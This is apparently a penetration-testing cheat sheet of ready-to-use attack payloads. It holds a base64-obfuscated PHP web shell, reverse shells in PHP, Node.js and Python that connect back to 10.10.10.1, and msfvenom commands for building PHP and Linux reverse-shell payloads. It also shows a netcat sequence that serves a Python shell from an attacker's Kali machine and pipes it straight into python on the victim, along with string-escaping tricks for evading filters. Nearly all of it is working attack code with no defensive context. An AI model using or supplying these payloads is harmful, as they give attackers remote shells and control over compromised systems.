## PHP Command Execution

Payload: echo passthru($_REQUEST["cmd"])
```
<pre><?php eval(base64_decode('ZWNobyBwYXNzdGhydSgkX1JFUVVFU1RbImNtZCJdKTsg'));?></pre>
```
## PHP Reverse Shell

```
$sock=fsockopen("10.10.10.1",5555);
exec("/bin/sh -i <&3 >&3 2>&3");
```

## MsfVenom PHP Reverse Shell

```
msfvenom -p php/reverse_php LHOST=10.0.0.1 LPORT=5555 -o ./rs.php
```

## Node.js Reverse Shell

```
var net = require("net"), sh = require("child_process").exec("/bin/sh");
var client = new net.Socket();
client.connect(5555, "10.10.10.1", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
sh.stderr.pipe(client);});
```

### Node.js notes

JavaScript strings can be escaped:

- hex encode: "/" -> "\\\\x2f" 

- unicode encode: "/" ->  "\\\\u002f"


## Python Reverse Shell

```
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.10.1",5555))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

## Serve Reverse Shell Remotely

Wait for connect back on Kali

```
kali@kali:~$ nc -nlvp 5555
```

Serve the shell from Kali

```
kali@kali:~$ nc -nvlp 4444 < shell.py
```

Get the shell from Kali and execute it on Victim

```
joe@victim:~$ nc 10.10.10.1 4444 | python
```


## MsfVenom Linux Reverse Shell 

```
$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.10.1 LPORT=4444 -f elf -o ./rs
```

